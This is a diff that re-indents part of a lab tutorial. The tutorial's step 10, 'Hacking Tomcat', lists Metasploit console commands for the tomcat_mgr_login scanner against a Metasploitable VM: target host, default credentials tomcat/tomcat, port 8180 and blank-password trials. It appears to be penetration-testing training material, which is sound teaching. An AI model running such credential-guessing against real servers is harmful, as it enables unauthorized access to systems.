@@ -501,18 +501,18 @@ Note: Take note of the Scan ID because you did not launched the scan, you just c
 Note: Of course you can do all this via the GUI and it would be faster and easier…I just wanted you to use the terminal screen to see it also works.
 -------------------------------------------------------------------------------------------------------------------------------
 
-		STEP #10: HACKING TOMCAT
-		18.	Type search tomcat and select the one that reads auxiliary/scanner/http/tomcat_mgr_login
+STEP #10: HACKING TOMCAT
+18.	Type search tomcat and select the one that reads auxiliary/scanner/http/tomcat_mgr_login
 
-		19.	Type use auxiliary/scanner/http/tomcat_mgr_login
-			a.	Type options
-			b.	Type setg rhosts <rhost_ip_address>
-				i.	…if not already set
-				c.	Type set login tomcat
-				d.	Type set password tomcat
-				e.	Type set rport 8180
-				f.	Type set_blank_passwords true
-				g.	Type run or exploit
+19.	Type use auxiliary/scanner/http/tomcat_mgr_login
+	a.	Type options
+	b.	Type setg rhosts <rhost_ip_address>
+		i.	…if not already set
+	c.	Type set login tomcat
+	d.	Type set password tomcat
+	e.	Type set rport 8180
+	f.	Type set_blank_passwords true
+	g.	Type run or exploit
 
-		20.	Open the browser and type the <metasploitable_ip_address>:8180
-				a.	Click on Status link
+20.	Open the browser and type the <metasploitable_ip_address>:8180
+	a.	Click on Status link
